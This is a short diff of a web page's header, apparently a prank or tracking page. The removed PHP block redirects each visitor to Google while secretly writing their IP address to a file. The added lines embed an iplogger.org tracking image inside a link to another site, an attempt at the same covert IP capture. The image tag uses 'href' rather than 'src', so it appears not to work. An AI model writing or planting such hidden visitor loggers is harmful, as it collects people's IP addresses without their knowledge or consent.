@@ -5,13 +5,9 @@
             
 <link rel="icon" type="image/png" href="things/media/img/favicon.png">	
 
-<?php
-header( 'Location: http://www.google.co.uk') ;
-$ip = $_SERVER['REMOTE_ADDR'];
-$fo = fopen("ip.txt", "a");
-$fw = fwrite($fo, "$ip\n");
-fclose($fo);
-?>
+<a href="https://xenz.gq/">
+  <img href="https://iplogger.org/listfull/sbfzn2QHwk5">
+</a>
 <!-- made by elpapu -->
         <link rel="stylesheet" href="things/css/style.css">
 		<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300" type="text/css">
